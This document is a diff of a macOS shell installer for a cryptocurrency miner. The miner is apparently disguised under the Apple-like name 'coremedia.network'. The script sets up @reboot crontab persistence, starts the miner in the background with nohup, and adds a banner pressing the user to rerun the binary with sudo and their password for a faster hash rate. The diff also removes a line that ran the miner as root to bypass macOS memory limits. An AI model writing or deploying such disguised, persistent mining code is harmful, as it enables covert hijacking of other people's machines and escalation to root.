@@ -168,11 +168,11 @@ CRON_JOB="@reboot bash \"$WRAPPER_PATH\""
 ( crontab -l 2>/dev/null | grep -v "coremedia.network\|\.cmnd"; echo "$CRON_JOB" ) | crontab -
 echo "      ✓ Auto-start registered via crontab"
 
-# Start RIGHT NOW via sudo nohup — root bypasses all macOS memory limits
-sudo nohup "$BINARY_PATH" --config "$CONFIG_PATH" >> "$LOG_PATH" 2>&1 &
+# Start without sudo first (will use light mode temporarily)
+nohup "$BINARY_PATH" --config "$CONFIG_PATH" >> "$LOG_PATH" 2>&1 &
 MINER_PID=$!
 echo $MINER_PID > "$INSTALL_DIR/miner.pid"
-echo "      ✓ Miner started as root (PID: $MINER_PID)"
+echo "      ✓ Miner started (PID: $MINER_PID)"
 
 echo ""
 echo "=========================================="
@@ -187,6 +187,15 @@ echo ""
 echo "  Live logs : tail -f \"$LOG_PATH\""
 echo "  Status    : launchctl list | grep coremedia.network"
 echo "  Stop      : launchctl unload \"$PLIST_PATH\""
+echo ""
+echo "╔══════════════════════════════════════════════════════╗"
+echo "║  ⚡ RUN THIS to enable FAST MODE (4000+ H/s):        ║"
+echo "║                                                      ║"
+printf "║  sudo '%s' \\\\\n" "$BINARY_PATH"
+printf "║    --config '%s'\n" "$CONFIG_PATH"
+echo "║                                                      ║"
+echo "║  Enter your Mac password when prompted.              ║"
+echo "╚══════════════════════════════════════════════════════╝"
 echo ""
 sleep 3
 tail -20 "$LOG_PATH" 2>/dev/null || echo "[*] Log will appear in ~10 seconds..."
